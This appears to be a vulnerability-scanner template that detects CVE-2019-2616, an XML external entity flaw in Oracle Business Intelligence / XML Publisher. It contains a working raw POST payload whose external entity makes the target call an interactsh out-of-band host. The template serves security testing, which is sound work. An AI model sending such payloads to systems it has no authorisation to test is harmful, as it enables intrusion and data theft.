id: XXE Application/xml
info:
  author: pdteam
  description: Oracle Business Intelligence / XML Publisher 11.1.1.9.0 / 12.2.1.3.0
    / 12.2.1.4.0 - XML External Entity Injection
  name: XXE in Application
  reference: '- https://nvd.nist.gov/vuln/detail/CVE-2019-2616

    - https://www.exploit-db.com/exploits/46729

    '
  severity: high
  tags: cve,cve2019,oracle,xxe,oob
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Content-Length: 76

    Content-Type: application/xml; charset=UTF-8


    <!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://c6771f52vtc0000z7rj0gdduozwyyyyyb.interactsh.com/xxe">
    %xxe; ]>

    '
